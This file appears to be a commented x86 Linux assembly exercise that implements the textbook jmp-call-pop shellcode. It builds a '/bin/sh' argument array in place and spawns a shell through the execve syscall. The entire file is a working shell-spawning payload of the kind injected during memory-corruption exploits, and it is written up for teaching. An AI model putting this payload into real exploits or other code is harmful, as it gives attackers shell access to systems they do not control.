; author: fuzboxz

global _start

section .text

_start:
    jmp short setvar

shellcode: 
    pop esi ; pop address of /bin/sh string from setvar
    xor ebx, ebx ; null out ebx
    mov byte [esi +7], bl ; overwrite the A in /bin/sh string with a null byte from bl
    mov dword [esi +8], esi ; overwrite the BBBB with the address of /bin/sh string
    mov dword [esi +12], ebx ; overwrite the CCCC portion with all nulls from ebx 

    lea ebx, [esi] ; filename
    lea ecx, [esi +8] ; address pointing to filename
    lea edx, [esi +12]; memory location pointing to all null bytes  
    
    xor eax, eax ; xor out eax 
    mov al, 0xb ;  sys_execve syscall
    
    int 0x80 ; call execve syscall

setvar:
    call shellcode
    file: db "/bin/shABBBBCCCC"
